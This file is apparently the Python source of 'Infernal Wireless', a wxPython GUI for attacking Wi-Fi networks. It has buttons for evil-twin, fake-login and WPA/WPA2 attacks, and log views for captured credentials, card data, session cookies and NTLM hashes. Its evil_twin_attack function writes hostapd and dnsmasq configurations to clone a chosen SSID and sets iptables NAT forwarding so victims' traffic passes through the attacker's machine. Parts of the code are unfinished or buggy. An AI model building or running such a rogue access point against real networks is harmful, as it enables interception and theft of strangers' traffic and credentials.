import wx
#from scapy.all import *
import commands, re
import wless_commands
from scapy.all import *
import os
import time
from subprocess import *
from bs4 import BeautifulSoup


class Example(wx.Frame):
	
	def __init__(self, *args, **kw):
		super(Example, self).__init__(*args, **kw)
		
		self.InitUI()
	

	def InitUI(self):
		
		pnl = wx.Panel(self)
		
		######### spider 
		start_image = wx.Image("spider.png")
		start_image.Rescale(180, 140)
		image = wx.BitmapFromImage(start_image) 
		pic=wx.StaticBitmap(pnl, -1, image, pos=(260, 70), style=wx.BITMAP_TYPE_PNG)
		
		
		######## logo
		start_image2 = wx.Image("scorpion.png")
		start_image2.Rescale(200, 150)
		image2 = wx.BitmapFromImage(start_image2) 
		pic2=wx.StaticBitmap(pnl, -1, image2, pos=(800, 20), style=wx.BITMAP_TYPE_PNG)
		
		#~ 
#		pic.SetBitmap(wx.Bitmap("spider.png"))
		#~ 
		
		attackbtn = wx.Button(pnl, label='Attack Methods', pos=(20,30))
		attackbtn.Bind(wx.EVT_BUTTON, self.OnClose)
		
		toolbtn = wx.Button(pnl, label='Tools', pos=(150,30))
		toolbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		confbtn = wx.Button(pnl, label='Configure', pos=(250,30))
		confbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		Logsbtn = wx.Button(pnl, label='Logs', pos=(350,30))
		Logsbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		aboutbtn = wx.Button(pnl, label='About', pos=(450,30))
		aboutbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		fakepagebtn = wx.Button(pnl, label='View Faked Page', pos=(450,30))
		fakepagebtn.Bind(wx.EVT_BUTTON, self.printme)
		
		#aboutbtn.SetBackgroundColour('BLUE')
		

############### CONFIGURE BELOW BUTTONS		
		
		ifcbtn = wx.Button(pnl, label='Select interface', pos=(20,90))
		ifcbtn.Bind(wx.EVT_BUTTON, self.OnClose)
		
		dbbtn = wx.Button(pnl, label='Prob Request', pos=(150,90))
		dbbtn.Bind(wx.EVT_BUTTON, self.probRequest)
		
		evtwbtn = wx.Button(pnl, label='Evil Twin', pos=(450,90))
		evtwbtn.Bind(wx.EVT_BUTTON, self.test)
		
		inwlbtn = wx.Button(pnl, label='Infernal Wireless', pos=(550,90))
		inwlbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		snprobbtn = wx.Button(pnl, label='Sniff Probs', pos=(700,90))
		snprobbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		
############## configure second below buttons

		ifcbtn = wx.Button(pnl, label='Scan Range  ', pos=(20,150))
		ifcbtn.Bind(wx.EVT_BUTTON, self.wireless_scan)
		
		dbbtn = wx.Button(pnl, label='Fake Login', pos=(150,150))
		dbbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		evtwbtn = wx.Button(pnl, label='Enable SSL', pos=(450,150))
		evtwbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		inwlbtn = wx.Button(pnl, label='WPA2 Ent. Hack ', pos=(550,150))
		inwlbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		snprobbtn = wx.Button(pnl, label='WPA/2 Attack', pos=(700,150))
		snprobbtn.Bind(wx.EVT_BUTTON, self.printme)
		
		
		read_only_txt = wx.TextCtrl(pnl, -1, '', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
		
		wireless_scan = wx.TextCtrl(pnl, -1, "wireless can results will be displayed here", style=wx.TE_MULTILINE,pos=(450, 200),size=(400,300))
		
		snotebtn = wx.Button(pnl, label='Save Note ', pos=(450,515))
		snotebtn.Bind(wx.EVT_BUTTON, self.printme)
		
		
		#Notes = wx.TextCtrl(pnl, -1, "Attacker can take notes here", style=wx.TE_MULTILINE,pos=(450, 550),size=(400,250)).GetValue()
		Notes = wx.TextCtrl(pnl, -1, "Attacker can take notes here", style=wx.TE_MULTILINE,pos=(450, 550),size=(400,250))
		
		
		view_logs = wx.TextCtrl(pnl, -1, 'Logs will be displayed here', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(880, 200),size=(300,600))
		
		myList = ['ssl strip', 'DB logs', 'Credentials','CC Info','session cookies', 'Media', 'NTLM Hashes']
		combo_box = wx.ComboBox(pnl, id=-1, value="View Logs", pos=(880, 150), size=(160, 30), choices=myList, style=0, name='logs')		
		
		self.SetSize((1200,900))
		self.SetTitle('Infernal Wireless')
		self.Centre()
		self.Show(True)

		########### text aread ######
		

		
	def OnClose(self, e):
		self.Close(True)
		
	def printme(self, e):
		print 'Hello World'
		
		
		######################### wireless scanner is ready #################
	def wireless_scan(self,e):
		read_only_txt = wx.TextCtrl(self, -1, '**WIRELESS SCAN**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
		output = str(commands.getstatusoutput("iw wlan0 scan")[1])

		p = r'SSID: \S*|cipher: \S*|Authentication suites: \S*'
		p = r'SSID: \S*|cipher: \S*'
		match = re.findall(p, output)
		grouped = list(zip(*[iter(match)] * 2))
		wireless_ssid_file = open('wScan.log', 'a')
		for i in grouped:
			#print sorted(i)
			read_only_txt.AppendText(str(sorted(i))+'\n')
			wireless_ssid_file.write(str(sorted(i))+'\n')
		wireless_ssid_file.close()
		
		######################### wireless scanner is ready #################
			
		######################### probe scanner is ready #################
	def probRequest(self, e):
		read_only_txt = wx.TextCtrl(self, -1, '**PROBE REQUEST**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
		wless_commands.start_probing()
		with open('prob_request.txt') as f:
			for i in f:
				if i.strip() != '':
					read_only_txt.AppendText(str(i))
	######################### probe scanner is ready #################			
	
    #~ def test(self,e):
		#~ self.new = NewWindow(parent=None, id=-1)
        #~ self.new.Show()	
	def test(self, e):
		self.new = EvilWindow(parent=None, id=-1)
		self.new.Show()
		
class EvilWindow(wx.Frame):
	
	

    def __init__(self,parent,id):
		
        wx.Frame.__init__(self, parent, id, 'New Window', size=(600,300))
        wx.Frame.CenterOnScreen(self)
        #self.new.Show(False))
        panel = wx.Panel(self, -1)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.listbox = wx.ListBox(panel, -1)
        hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
        btnPanel = wx.Panel(panel, -1)
        vbox = wx.BoxSizer(wx.VERTICAL)
       
        select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
        attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))
        
        self.Bind(wx.EVT_BUTTON, self.ScanW, id=-1)
        
        attack.Bind(wx.EVT_BUTTON, self.attack_W)
        
        #self.Bind(wx.EVT_LISTBOX_DCLICK, self.OnRename)
        vbox.Add((-1, 20))
        vbox.Add(select)
        vbox.Add(attack)
        
        btnPanel.SetSizer(vbox)
        hbox.Add(btnPanel, 0.6, wx.EXPAND | wx.RIGHT, 20)
        panel.SetSizer(hbox)
        self.Centre()
        self.Show(True)
    app_select= ''
    
    def ScanW(self, event):
		with open('wScan.log') as f:
			for i in f:
				self.listbox.Append(i)
	
    
    def attack_W(self, e):
		sel = self.listbox.GetSelection()
		text = self.listbox.GetString(sel)
		text_split = str(text).split(', ')
		app_select = text_split[0].replace("['SSID:","").replace("'","").strip()
		##### remove ['SSID: 
		evil_twin_attack(app_select)
		
		
		
		######## close the child frame
		
		self.Show(False)
		
	
	def evil_twin_attack(SSID):
		
		output = Popen(["iwconfig"], stdout=PIPE).communicate()[0]
		wireless_interface = ""
		mon_iface = ""
		if "wlan" in output:
			wireless_interface = output[0:6].strip()


		mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]
		hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
		config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid="+SSID+"\nchannel=1\n#enable_karma=1\n"
		hostapd.write(config_file)
		hostapd.close()
		os.system("service hostapd start")
		
		os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
		cat <<EOF > /etc/dnsmasq.conf
		log-facility=/var/log/dnsmasq.log
		#address=/#/10.0.0.1
		#address=/google.com/10.0.0.1
		interface=wlan0
		dhcp-range=10.0.0.10,10.0.0.250,12h
		dhcp-option=3,10.0.0.1
		dhcp-option=6,10.0.0.1
		#no-resolv
		log-queries
		EOF""")

		os.system("service dnsmasq start")

		
		os.system("""ifconfig wlan0 up
		ifconfig wlan0 10.0.0.1/24

		iptables -t nat -F
		iptables -F
		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
		iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
		echo '1' > /proc/sys/net/ipv4/ip_forward""")


	
def main():
	
	ex = wx.App()
	Example(None)
	
	ex.MainLoop()
	

if __name__ == '__main__':
	main()
	
